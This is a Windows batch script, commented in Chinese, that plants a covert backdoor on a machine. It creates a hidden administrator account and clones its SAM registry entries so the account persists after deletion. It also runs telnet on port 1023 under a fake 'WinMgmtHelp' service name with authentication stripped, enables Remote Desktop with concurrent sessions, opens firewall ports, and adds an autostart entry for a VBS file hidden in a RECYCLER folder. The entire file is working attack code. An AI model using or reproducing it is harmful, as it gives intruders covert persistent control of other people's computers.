@echo off
rem
@echo **************************************************************************************************************************************************************************************
@echo                 *总说明：
@echo     *每句命令的下面一句是命令的说明
@echo on
@echo off
@echo HKEY_LOCAL_MACHINE\SAM\SAM [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo off
gpupdate /force
@echo     *打开注册表访问权限，刷新注册表
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v etest$ /t reg_dword /d 0 /f
@echo     *第一句是对用户的影藏
@echo off
net user etest$ 123456 /add
@echo on
@echo     *创建用户
@echo on
@echo off
net localgroup administrators etest$ /add
@echo off
regedit /e dc1.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names
@echo off
regedit /e dc2.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
@echo on
@echo on
@echo     *提升用户权限
@echo     *导出注册表用户信息
@echo off
net user etest$ /del
@echo on
@echo on
@echo     *删除创建的用户
@echo off
gpupdate /force
@echo     *刷新注册表
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo off 
regedit /s E:\RECYCLER\dc1.reg
@echo on
@echo off 
regedit /s E:\RECYCLER\dc2.reg
@echo on
@echo     *导入刚才导出的注册表
@echo off
gpupdate /force
@echo     *刷新注册表
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo off
net localgroup administrators etest$ /add
@echo     *提升用户权限
@echo on
@echo off
gpupdate /force
@echo     *刷新注册表
@echo on
@echo on
@echo on
@echo on
@echo off
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo on
@echo on
@echo off
gpupdate /force
@echo     *关闭注册表访问权限，刷新注册表
@echo off
@echo **************************************************************************************************************************************************************************************
@echo off
tlntadmn config port=1023
@echo on
@echo     *更改端口
@echo off
sc.exe create WinMgmtHelp binpath= C:\WINDOWS\system32\tlntsvr.exe start= auto
@echo on
@echo off 
regedit /s E:\RECYCLER\ytel.reg
@echo on
@echo     *导入已准备的注册表伪装服务
@echo off
gpupdate /force
@echo on
@echo on
@echo on
@echo on
@echo off
net stop telnet
@echo     *停止telnet
@echo off
sc config tlntsvr start= disabled
@echo     *telnet设置为已禁止
@echo off
sc config WinMgmtHelp start= auto
@echo     *设置服务为自动
@echo off
net start WinMgmtHelp
@echo     *启动服务
@echo on
@echo off
netsh.exe firewall add portopening tcp 1023 GotIT
@echo     *在防火墙添加端口例外
@echo off
gpupdate /force
@echo     *刷新注册表
@echo off
sc config tlntsvr start= disabled
@echo     *telnet设置为已禁止
@echo on
@echo off
tlntadmn < telnet.txt
@echo     *删除telnet的NTLM验证
@echo off
@echo **************************************************************************************************************************************************************************************
@echo off
echo Windows Registry Editor Version 5.00 >3389.reg
echo. >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg
echo "fDenyTSConnections"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg
echo "PortNumber"=dword:00000d3d >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg
echo "PortNumber"=dword:00000d3d >>3389.reg
@echo on    
@echo on
@echo off
regedit /s E:\RECYCLER\3389.reg
@echo on
@echo off
gpupdate /force
@echo     *刷新注册表
@echo off
netsh.exe firewall add portopening tcp 3389 GotII
@echo     *在防火墙添加端口例外
@echo on
@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t reg_dword /d 1 /f
@echo     *溢出攻击，允许电脑被远程桌面
@echo off
@echo **************************************************************************************************************************************************************************************
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WallPaper03 /t reg_sz /d "D:\RECYCLER\AUTORUN.INE.vbs" /f
@echo on
@echo     *注册表加启动项
@echo *****************************************************************